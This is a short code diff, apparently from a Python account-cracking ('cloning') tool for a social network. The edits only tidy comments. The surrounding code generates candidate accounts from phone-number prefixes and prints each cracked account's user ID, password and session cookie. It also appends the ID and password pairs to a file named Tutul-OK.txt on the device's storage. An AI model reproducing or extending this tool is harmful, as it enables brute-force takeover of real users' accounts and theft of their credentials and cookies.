@@ -155,8 +155,7 @@ def xxr():
     rk2 = '0172'
     rk3 = '0175'
     rk4 = '017'
-    code = random.choice([rk1,rk2,rk3])
-       # input(f' [{xr}■{x}] Choose : ')
+    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
     os.system('clear')
     print(logo)
     limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
@@ -232,7 +231,6 @@ def rcrack(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\r\r\033[1;32m[Tutul-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                #print('\r\r\33[1;30m[Tutul-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                 open('/sdcard/Tutul-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
